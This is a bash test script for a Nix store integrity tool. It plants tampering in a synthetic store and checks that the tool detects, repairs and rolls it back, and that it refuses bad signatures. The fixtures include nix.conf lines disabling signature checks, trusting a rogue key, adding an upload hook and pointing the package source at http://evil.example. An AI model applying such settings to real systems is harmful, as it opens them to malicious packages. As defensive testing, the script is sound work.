#!/bin/bash
# nix backend: attack cycle + trust negatives on the synthetic NixOS store.
set -uo pipefail
. /home/claude/pmtrust/tests/harness.sh
W=/srv/t/cycle-ysam; N=/srv/t/nix; H=ysam
NK="--nix-cache file://$N/cache --nix-trusted-key $(cat $N/pk)"
PASS=0; FAIL=0
ok()   { echo "PASS  $*"; PASS=$((PASS+1)); }
bad()  { echo "FAIL  $*"; FAIL=$((FAIL+1)); }
check(){ if eval "$2"; then ok "$1"; else bad "$1"; fi; }
read P1 P2 < $N/paths
rm -rf $W; mkdir -p $W; cp -a /srv/t/ysam-clean $W/atk
B=$W/atk$P1/bin/nix; chmod u+w $B; python3 -c "import sys;p=sys.argv[1];b=bytearray(open(p,'rb').read());b[-300]^=1;open(p,'wb').write(bytes(b))" $B; chmod 555 $B
sqlite3 $W/atk/nix/var/nix/db/db.sqlite "UPDATE ValidPaths SET hash='sha256:$(sha256sum $B | cut -c1-64)' WHERE path='$P1'"
printf 'require-sigs = false\nextra-trusted-public-keys = evil-1:%s\npost-build-hook = /tmp/upload.sh\n' "$(head -c32 /dev/urandom | base64)" >> $W/atk/etc/nix/nix.conf
echo 'NIX_CONFIG="substituters = http://evil.example"' >> $W/atk/etc/environment
cp -a $W/atk $W/pristine
collect $W/atk $H >/dev/null 2>&1
printf '%s\n' $P1 > $W/atk/tmp/need-hashes.txt
S=$(COLLECT_ARGS="--hash-list /tmp/need-hashes.txt" collect $W/atk $H 2>/dev/null)
python3 $PM plan --agent $AGENT --snapshot $S --out $W/plan $NK > $W/plan.out 2>&1; rc=$?
check "plan exits 2" '[ $rc = 2 ]'
for pat in "bin/nix (si3s1mm8mxgmhwi5mg7qpjwzdsip9hf7-nix-2.24.12): content differs" "nix db records a different NAR hash" \
           "require-sigs = false" "trusts keys you did not pin" "post-build-hook" "NIX_CONFIG"; do
    check "reported: $pat" 'grep -qF -- "$pat" $W/plan/report.txt'
done
apply_in $W/atk $H $W/plan --apply > $W/apply.out 2>&1; rc=$?
check "apply exits 0 and verify is clean" '[ $rc = 0 ] && grep -q "verify: .* 0 critical" $W/apply.out'
check "store file is byte-identical to the signed NAR content" 'cmp -s $W/atk$P1/bin/nix /srv/t/ysam-clean$P1/bin/nix'
check "store file mode is the store mode (0555)" '[ "$(stat -c %a $W/atk$P1/bin/nix)" = 555 ]'
apply_in $W/atk $H $W/plan --apply > $W/apply2.out 2>&1
check "second apply is a no-op" 'grep -q "changed=0 " $W/apply2.out'
cp -a $W/pristine $W/rb; collect $W/rb $H >/dev/null 2>&1
apply_in $W/rb $H $W/plan --apply > $W/rb.out 2>&1
RBW=$(grep -o '/var/lib/pmtrust/run-[0-9TZ]*' $W/rb.out | head -1)
unshare -u -m sh -c "hostname $H; mount --bind /dev $W/rb/dev; chroot $W/rb /root/pmtrust/plan/bin/busybox sh /root/pmtrust/plan/apply.sh --rollback $RBW" > $W/rollback.out 2>&1
check "rollback restores the tampered store file" 'cmp -s $W/rb$P1/bin/nix $W/pristine$P1/bin/nix'
# trust negatives
neg() { local name=$1 pat=$2; shift 2; python3 $PM plan --agent $AGENT --snapshot $S --out $W/neg-$RANDOM "$@" > $W/neg.out 2>&1; local rc=$?
        if [ $rc = 1 ] && grep -qE "$pat" $W/neg.out; then ok "$name"; else bad "$name (rc=$rc)"; grep FATAL $W/neg.out | head -2; fi; }
neg "no pinned cache key is refused" "pin the binary cache key" --nix-cache file://$N/cache
neg "a different pinned key is refused" "no signature by a pinned key" --nix-cache file://$N/cache --nix-trusted-key "other-1:$(head -c32 /dev/urandom | base64)"
neg "same key name, wrong key bytes is refused" "does NOT verify" --nix-cache file://$N/cache --nix-trusted-key "test-cache-1:$(head -c32 /dev/urandom | base64)"
rm -rf $W/cache; cp -a $N/cache $W/cache; NI=$(ls $W/cache/${P1:11:32}.narinfo); sed -i 's/^NarSize: \([0-9]*\)/NarSize: 1\1/' $NI
neg "narinfo edited after signing is refused" "does NOT verify" --nix-cache file://$W/cache --nix-trusted-key "$(cat $N/pk)"
rm -rf $W/cache; cp -a $N/cache $W/cache; NAR=$W/cache/$(grep '^URL:' $W/cache/${P1:11:32}.narinfo | cut -d' ' -f2)
python3 -c "import sys;p=sys.argv[1];b=bytearray(open(p,'rb').read());b[len(b)//2]^=1;open(p,'wb').write(bytes(b))" $NAR
neg "tampered NAR is refused" "FileHash does not match|NAR does not match|LZMA|Error" --nix-cache file://$W/cache --nix-trusted-key "$(cat $N/pk)"
echo "== $H (synthetic nix): $PASS passed, $FAIL failed (details in $W)"
